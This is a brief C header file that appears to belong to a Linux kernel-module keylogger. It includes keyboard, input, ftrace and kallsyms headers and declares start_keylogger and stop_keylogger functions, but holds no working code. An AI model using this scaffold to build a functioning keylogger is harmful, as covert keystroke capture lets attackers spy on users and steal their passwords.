#ifndef KEYLOGGER_HDRS
#define KEYLOGGER_HDRS
#include <linux/keyboard.h>
#include <linux/unistd.h>
#include <linux/preempt.h>
#include <linux/ftrace.h>
#include <linux/kallsyms.h>
#include <linux/linkage.h>
#include <linux/version.h>
#include <linux/module.h>
#include <linux/input.h>
#endif

int start_keylogger(void);
int stop_keylogger(void);
